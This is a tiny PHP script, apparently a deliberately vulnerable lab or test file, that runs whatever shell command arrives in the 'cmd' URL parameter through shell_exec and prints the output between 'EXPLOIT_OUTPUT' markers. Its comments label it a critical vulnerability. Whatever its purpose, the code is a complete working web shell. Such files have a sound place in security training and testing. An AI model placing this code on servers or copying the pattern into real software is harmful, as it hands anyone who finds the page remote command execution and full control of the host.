<?php
// VULNERABILITY: Unsanitized input passed directly to shell execution (CVSS 9.8)
header('Content-Type: text/plain');

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // Completely unescaped command execution
    $output = shell_exec($cmd . " 2>&1");
    echo "EXPLOIT_OUTPUT_START\n";
    echo $output;
    echo "EXPLOIT_OUTPUT_END\n";
} else {
    echo "Usage: ?cmd=<system_command>";
}
?>